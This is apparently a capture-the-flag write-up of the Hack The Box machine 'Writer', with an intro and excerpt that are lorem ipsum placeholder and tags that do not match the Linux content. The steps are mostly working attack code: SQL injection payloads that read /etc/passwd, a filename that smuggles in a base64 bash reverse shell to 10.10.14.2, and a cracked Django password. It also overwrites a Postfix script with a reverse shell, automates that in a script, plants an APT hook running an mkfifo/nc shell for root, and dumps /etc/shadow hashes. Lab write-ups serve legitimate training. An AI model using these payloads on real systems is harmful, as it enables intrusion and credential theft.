---
layout: single
title: Writer - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-09-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-writer/writer_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-writer/writer_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

# USER

### Step 1
Standard enum with nmap, dirb, nikto, ffuf, smbclient and rpcclient.

__nmap__:
```bash
$ nmap -Pn -n -sCV 10.10.11.101
  PORT    STATE SERVICE     VERSION
  22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
  |   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
  |_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
  80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  |_http-title: Story Bank | Writer.HTB
  139/tcp open  netbios-ssn Samba smbd 4.6.2
  445/tcp open  netbios-ssn Samba smbd 4.6.2
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  |_clock-skew: 1m50s
  |_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb2-security-mode:
  |   2.02:
  |_    Message signing enabled but not required
  | smb2-time:
  |   date: 2021-09-09T11:21:07
  |_  start_date: N/A
```

__DIRB__:
```bash
+ http://10.10.11.101/about (CODE:200|SIZE:3522)
+ http://10.10.11.101/contact (CODE:200|SIZE:4905)
+ http://10.10.11.101/dashboard (CODE:302|SIZE:208)
+ http://10.10.11.101/logout (CODE:302|SIZE:208)
+ http://10.10.11.101/server-status (CODE:403|SIZE:277)
==> DIRECTORY: http://10.10.11.101/static/
```

__FFUF__:
```bash
+ administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]
```

__NIKTO__:
```bash
+ Server: Apache/2.4.41 (Ubuntu)
```

__SMBCLIENT__:
```bash
$ smbclient -L 10.10.11.101
Enter WORKGROUP\voids password:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	writer2_project Disk
	IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
```

__RPCCLIENT__:
```bash
$ rpcclient -U "" -N 10.10.11.101                                                                            130 ⨯
rpcclient $> enumdomusers
  user:[kyle] rid:[0x3e8]
rpcclient $> enumdomains
  name:[WRITER] idx:[0x0]
rpcclient $> queryuser kyle
	User Name   :	kyle
	Full Name   :	Kyle Travis
	Home Drive  :	\\writer\kyle
	Dir Drive   :
	Profile Path:	\\writer\kyle\profile
	Logon Script:
	Description :
	Workstations:
	Comment     :
	Remote Dial :
	Logon Time               :	Thu, 01 Jan 1970 01:00:00 CET
	Logoff Time              :	Wed, 06 Feb 2036 16:06:39 CET
	Kickoff Time             :	Wed, 06 Feb 2036 16:06:39 CET
	Password last set Time   :	Tue, 18 May 2021 19:03:35 CEST
	Password can change Time :	Tue, 18 May 2021 19:03:35 CEST
	Password must change Time:	Thu, 14 Sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x3e8
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```
----------------------------------------------------------------

### Step 2

The login formula at http://writer.htb/administrative is vulnerable to SQL injection and can be bypassed by entering "admin'-- -" as user, with any password. The admin dashboard have an interesting upload function but after playing around with it for a few hours I decide to move on and go back to the vulnerable login function.

Play around with Burp repeater with the goal to extract sensitive database information.

__REQUEST 1:__
```bash
POST /administrative HTTP/1.1
 Host: 10.10.11.101
 ..
 uname=admin%27 union all select 1,@@version,3,4,5,6;-&password=123
```

__RESPONSE 1:__
```bash
10.3.29-MariaDB-0ubuntu0.20.04.1
```

### POLLING DB WRITER:
__REQUEST 2:__
```bash
uname=admin%27 union all select 1,concat(0x2c,table_name),3,4,5,6 FROM information_schema.TABLES WHERE table_schema='writer';-&password=123
```

__RESPONSE 2:__
```bash
site,stories,users
```

__REQUEST 3:__
```bash
uname=admin%27 union all select 1,concat(username,0x3a,password),3,4,5,6 from users;-&password=123
```

__RESPONSE 3:__
```bash
admin:118e48794631a9612484ca8b55f622d0
```

### POLLING DB INFORMATION_SCHEMA:
__REQUEST 4:__
```bash
uname=admin%27 union all select 1,concat(table_name,0x2c),3,4,5,6 from information_schema.tables;-&password=123
```

__RESPONSE 4:__
```bash
ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_CACHES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,GEOMETRY_COLUMNS,SPATIAL_REF_SYS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,USER_STATISTICS,INNODB_SYS_TABLESTATS,INNODB_LOCKS,INNODB_MUTEXES,INNODB_CMPMEM,INNODB_CMP_PER_INDEX,INNODB_CMP,INNODB_FT_DELETED,INNODB_CMP_RESET,INNODB_LOCK_WAITS,TABLE_STATISTICS,INNODB_TABLESPACES_ENCRYPTION,INNODB_BUFFER_PAGE_LRU,INNODB_SYS_FIELDS,INNODB_CMPMEM_RESET,INNODB_SYS_COLUMNS,INNODB_FT_INDEX_TABLE,INNODB_CMP_PER_INDEX_RESET,user_variables,INNODB_FT_INDEX_CACHE,INNODB_SYS_FOREIGN_COLS,INNODB_FT_BEING_DELETED,INNODB_BUFFER_POOL_STATS,INNODB_TRX,INNODB_SYS_FOREIGN,INNODB_SYS_TABLES,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_CONFIG,INNODB_BUFFER_PAGE,INNODB_SYS_TABLESPACES,INNODB_METRICS,INNODB_SYS_INDEXES,INNODB_SYS_VIRTUAL,INNODB_TABLESPACES_SCRUBBING,INNODB_SYS_SEMAPHORE_WAITS,site,stories,users,
```

At the end we see table **users**, lets extract columns from it.

__REQUEST 5:__
```bash
uname=admin%27 union all select 1,concat(column_name,0x2c),3,4,5,6 from information_schema.columns where table_name='users';-&password=123
```

__RESPONSE 5:__
```bash
id,username,password,email,status,date_created,
```

__REQUEST 6:__
```bash
uname=admin%27 union all select 1,concat(username,0x3a,password),3,4,5,6 from information_schema.users;-&password=123
```

__RESPONSE 6:__
```bash
Incorrect creds.
```

Unfortunately we are not able to get any credentials from the writer database, however we were able to get the information_schema admin credentials in request 3.

----------------------------------------------------------------

### Step 3

We can't crack the admin-hash using hashcat and rockyou.txt, nor is the hash in crackstation.org.
Playing around further with SQLi we are able to read files (LFI) using load_file.

__REQUEST 7:__
```bash
uname=admin%27 union all select 1,load_file('/etc/passwd'),3,4,5,6;--&password=123
```

__RESPONSE 7:__
```python
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
```


At this point I'm pretty stumped and unsure what to look for, so to simplify things I sent the SQL Injection to Burp Intruder and fired it up using a LFI-list. From the output we found `etc/apache2/sites-enabled/000-default.conf` which gave us additional clues.

__REQUEST 8:__
```bash
uname=admin%27 union all select 1,load_file('%2fetc%2fapache2%2fsites-enabled%2f000-default%2econf'),3,4,5,6;--&password=123
```

__RESPONSE 8:__
```php
# Virtual host configuration for writer.htb domain
&lt;VirtualHost *:80&gt;
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        &lt;Directory /var/www/writer.htb&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        Alias /static /var/www/writer.htb/writer/static
        &lt;Directory /var/www/writer.htb/writer/static/&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
&lt;/VirtualHost&gt;

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#&lt;VirtualHost 127.0.0.1:8080&gt;
#	ServerName dev.writer.htb
#	ServerAdmin admin@writer.htb
#
# Collect static for the writer2_project/writer_web/templates
#	Alias /static /var/www/writer2_project/static
```

- We find the absolute path of the web server: `/var/www/writer.htb`
- A new interesting file: `/var/www/writer.htb/writer.wsgi`
- Can from the output we can assume that SMB and the dir `writer2_project` is a rabbit hole

If we look on the file `/var/www/writer.htb/writer.wsgi` it will point us towards a new file, `/var/www/writer.htb/writer/__init__.py`. Investigating the file we find that all uploaded images are moved using a vulnerable `os.system` function:
```bash
os.system("mv {} {}.jpg".format(local_filename, local_filename))
```

----------------------------------------------------------------

### Step 4

Exploit the file upload POST form `image_url` to get a reverse shell.

1. Base64 encode a bash reverse shell
```bash
$ echo -n '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.2/4488 0>&1"' | base64
  L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDg4IDA+JjEi
```

2. Add the exploit code to a .jpg image
```bash
$ touch 'skull.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDg4IDA+JjEi|base64 -d | bash`;'
```

3. Upload the exploited .jpg image and capture the POST in Burp
4. Since we know the absolute path of the file, execute the malicious code under the `image_url` POST form:
```bash
Content-Disposition: form-data; name="image_url"
file:///var/www/writer.htb/writer/static/img/skull.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDg4IDA+JjEi|base64 -d | bash`;
```

5. Capture the incoming request
```bash
$ nc -lvnp 4488
	listening on [any] 4488 ...
	connect to [10.10.14.2] from (UNKNOWN) [10.10.11.101] 56014
	bash: cannot set terminal process group (1023): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@writer:/$
```

----------------------------------------------------------------

### Step 5

As `www-data` we are not able to grab `user.txt` yet. Use linpeas to find a way to pivot to user kyle or john.

```bash
www-data@writer:/dev/shm$ linpeas.sh
	..
	Analyzing MariaDB Files (limit 70)
	-rw-r--r-- 1 root root 972 May 19 12:34 /etc/mysql/mariadb.cnf
	[client-server]
	!includedir /etc/mysql/conf.d/
	!includedir /etc/mysql/mariadb.conf.d/
	[client]
	database = dev
	user = djangouser
	password = DjangoSuperPassword
	default-character-set = utf8
```

```bash
www-data@writer:/home/kyle$ mysql -u djangouser -p
	MariaDB [dev]> show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| dev                |
	| information_schema |
	+--------------------+
	2 rows in set (0.000 sec)

	MariaDB [dev]> show tables;
	+----------------------------+
	| Tables_in_dev              |
	+----------------------------+
	| auth_group                 |
	| auth_group_permissions     |
	| auth_permission            |
	| auth_user                  |
	| auth_user_groups           |
	| auth_user_user_permissions |
	| django_admin_log           |
	| django_content_type        |
	| django_migrations          |
	| django_session             |
	+----------------------------+
	10 rows in set (0.000 sec)

	MariaDB [dev]> SELECT * from auth_user;
	+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
	| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
	+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
	|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
	+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
	1 row in set (0.001 sec)
```

Looking through hashcat example hashes it seems to be a Django (m10000) hash, which makes sense.

```bash
void@void:~/Documents$ hashcat -a0 -m10000 hash.txt /usr/share/wordlists/rockyou.txt
  ..
  pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio

  Session..........: hashcat
  Status...........: Cracked
  Hash.Type........: Django (PBKDF2-SHA256)
  Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
```

----------------------------------------------------------------

### Step 6

6. Login with cracked creds (kyle:marcoantonio) and grab user.txt

```bash
$ ssh kyle@writer.htb
kyle@writer:~$ id && hostname
  uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
  writer
kyle@writer:~$ cat user.txt
  b20af09f4741426d488658c2d7319527
```

----------------------------------------------------------------

# ROOT

### Step 1

As usual check `sudo -l`, which is not available for user kyle.
Running linpeas we find a few interesting things:

```bash
Users with console:
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash

User Groups:
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
uid=997(filter) gid=997(filter) groups=997(filter)
```

User `kyle` is in group `filter`, and `filter` is in control of `postfix`.
Linpeas also shows us that `/etc/postfix/master.cf` is present and contains scripts to be executed, hinting that this should probably be used to pivot or get root access.

```bash
-rw-r--r-- 1 root root 6373 Sep 10 13:18 /etc/postfix/master.cf
  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
#  user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m ${extension} ${user}
#  flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

Analyzing the last line means /etc/postfix/disclaimer will be executed if a new mail is received from user john.

```bash
kyle@writer:/etc/postfix$ ls -al | grep discl
  -rwxrwxr-x   1 root filter  1022 Sep 10 13:44 disclaimer
```

The `disclaimer`-file  is owned by group `filter`, meaning kyle should be able to modify it - making it possible to inject a shell to be executed when triggered.

----------------------------------------------------------------

### Step 2

Edit `disclaimer` and change to `#!/bin/bash`, and paste a (bash) reverse shell.
Send a mail with netcat and wait for shell. Ideally this should be scripted with python or at the very least bash.

```bash
kyle@writer:/etc/postfix$ vim disclaimer
kyle@writer:/etc/postfix$ nc localhost 25
  220 writer.htb ESMTP Postfix (Ubuntu)
  HELO writer.htb
    250 writer.htb
  MAIL FROM:<kyle@writer.htb>
    250 2.1.0 Ok
  RCPT TO:<kyle@writer.htb>
    250 2.1.5 Ok
  DATA
    354 End data with <CR><LF>.<CR><LF>
  Subject: Hack Tack!
  .
    250 2.0.0 Ok: queued as 9FF0C802

┌──(void㉿kali)-[~/Documents]
└─$ nc -lvnp 4488
  listening on [any] 4488 ...
  connect to [10.10.14.2] from (UNKNOWN) [10.10.11.101] 33778
  bash: cannot set terminal process group (371156): Inappropriate ioctl for device
  bash: no job control in this shell
  john@writer:/var/spool/postfix$ id
    uid=1001(john) gid=1001(john) groups=1001(john)
```

Here's a quick and dirty bash script I made to automate the process:
```bash
kyle@writer:/dev/shm$ cat noob.sh 
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.2/4488 0>&1' > /etc/postfix/disclaimer
sleep 1
(	echo 'HELO writer.htb'
	sleep 1
	echo 'MAIL FROM:<kyle@writer.htb>'
	sleep 1
	echo 'RCPT TO:<kyle@writer.htb>'
	sleep 1
	echo 'DATA'
	sleep 1
	echo 'Subject: Plz give revshell'
	sleep 1
	echo 'Hello Mr.\nPlease give me a reverse shell.\n\nBest wishes,\nP3'
	echo .
	echo QUIT ) | nc -v localhost 25
```

Not sure how and why this gave us a shell for user john, when I sent the mail to and from kyle. Reading on hacktricks we have the following example:
> For example the line `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` means that `/etc/postfix/filtering` will be executed if a new mail is received by the user mark

With this logic we recipient should be john, in order to spawn the new shell. But maybe it's just that the script is triggered by user john? 

----------------------------------------------------------------

### Step 3

Get persistence as John and grab his private key, relogin. 

```bash
┌──(void㉿void)-[/git/htb/writer]
└─$ ssh john@writer.htb -i john-id_rsa
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

Since john is in group `management` I assume the privesc has something to do with that. Start to look for files and directories owned by group `management`.

```bash
john@writer:/dev/shm$ find / -type f -group management 2>/dev/null
john@writer:/dev/shm$ find / -type d -group management 2>/dev/null
/etc/apt/apt.conf.d
```

We (`management`) own apt.conf.d meaning we can abuse cron job to get a root shell. Looking through the running processes with `pspy64` we can see that `/usr/bin/apt-get update` is executed frequently. We can exploit this by creating our own malicious file inside `apt.conf.d` to be executed along with `apt-get update`.

```bash
john@writer:/dev/shm$ ./pspy64
..
2021/09/14 08:26:01 CMD: UID=0    PID=250774 | /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} ; 
2021/09/14 08:26:01 CMD: UID=0    PID=250777 | /usr/sbin/CRON -f 
2021/09/14 08:26:01 CMD: UID=0    PID=250776 | /usr/sbin/CRON -f 
2021/09/14 08:26:01 CMD: UID=0    PID=250779 | /usr/sbin/CRON -f 
2021/09/14 08:26:01 CMD: UID=0    PID=250780 | /usr/bin/apt-get update 
2021/09/14 08:26:01 CMD: UID=0    PID=250781 | /usr/bin/apt-get update 
2021/09/14 08:26:01 CMD: UID=0    PID=250784 | /bin/sh -c /usr/bin/cp /root/.scripts/master.cf /etc/postfix/master.cf 
2021/09/14 08:26:01 CMD: UID=0    PID=250783 | /usr/bin/cp -r /root/.scripts/writer2_project /var/www/ 
2021/09/14 08:26:01 CMD: UID=0    PID=250782 | /bin/sh -c /usr/bin/cp -r /root/.scripts/writer2_project /var/www/ 
2021/09/14 08:26:01 CMD: UID=0    PID=250785 | /usr/lib/apt/methods/http 
2021/09/14 08:26:01 CMD: UID=0    PID=250786 | /usr/bin/apt-get update 
2021/09/14 08:26:01 CMD: UID=33   PID=250787 | /usr/bin/python3 manage.py runserver 127.0.0.1:8080 
```

```bash
john@writer:/etc/apt/apt.conf.d$ cat 15update-stamp 
APT::Update::Post-Invoke-Success {"touch /var/lib/apt/periodic/update-success-stamp 2>/dev/null || true";};
john@writer:/etc/apt/apt.conf.d$ echo 'APT::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4488 >/tmp/f";};' > pwn
```

Wait a few seconds and we'll get a root shell.

```bash
┌──(void㉿void)-[~/Documents/scanners/linux]
└─$ nc -lvnp 4488                                                                                                                 1 ⨯
listening on [any] 4488 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.101] 52798
/bin/sh: 0: can't access tty; job control turned off
# id && hostname
uid=0(root) gid=0(root) groups=0(root)
writer
# cat /root/root.txt
f77d661fda2c7db3f5e3f04f17a64490

# cat /etc/shadow
root:$6$gev1Op0YfgboE7iR$iMNbP.8qic/SzTr4atxwLbkI7nScyZWJPbTgoXAlEz5Hcw3Ntget9j3p.iccPcw5Jl4dj4bHWZ5LvoLLNC8iB.:18816:0:99999:7:::
kyle:$6$Rke6Q45ycHoY4Ubp$5mG3iCMK/tnLRjVXQupFh0IJAz7TcBrLJl8DZqOnboZMnOaHTM3lOxacYj3zVcR1MJ8EeSZxuAdETDlldpw7p1:18765:0:99999:7:::
john:$6$jnLfY8nfX7rgN0kn$gy5CL/IZikTiLcBZVHVEu5Kl/imxKmSvooN1JjohPjVLIygTts8HNaLRAEr7zoaCk7/pb9jzKBbgBSEdxwknj0:18761:0:99999:7:::
mysql:!:18762:0:99999:7:::
```

----------------------------------------------------------------

# REFERENSES

__SQL Injection:__
- https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8
- https://asdqw3.medium.com/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada

__Postfix:__
- https://book.hacktricks.xyz/pentesting/pentesting-smtp#postfix

__APT Reverse Shell:__
- https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/